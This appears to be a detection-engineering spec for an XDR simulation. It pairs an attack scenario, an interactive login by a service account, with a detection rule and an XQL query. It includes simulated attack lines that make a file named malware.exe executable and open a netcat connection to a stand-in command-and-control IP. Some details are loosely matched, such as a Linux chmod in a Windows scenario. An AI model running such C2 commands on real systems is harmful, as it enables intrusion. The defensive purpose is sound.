identity.description: An attacker logs into a Windows endpoint using a service account with interactive login privileges, which triggers the CortexSim alert. This behavior is typically followed by execution of malicious payloads via WMI or PowerShell.

stub chmod +x /tmp/malware.exe

C2_IP="192.0.2.10"
nc -v $C2_IP 443

biocs.name: Interactive Login by Service Account
biocs.description: Detection of interactive login using a service account
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'winlogon.exe' and action_process_image_name = 'cmd.exe'

xql_queries.name: Detect Interactive Login via Service Account
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'winlogon.exe' and action_process_image_name = 'cmd.exe'
| fields agent_hostname, actor_process_image_name, action_process_image_name
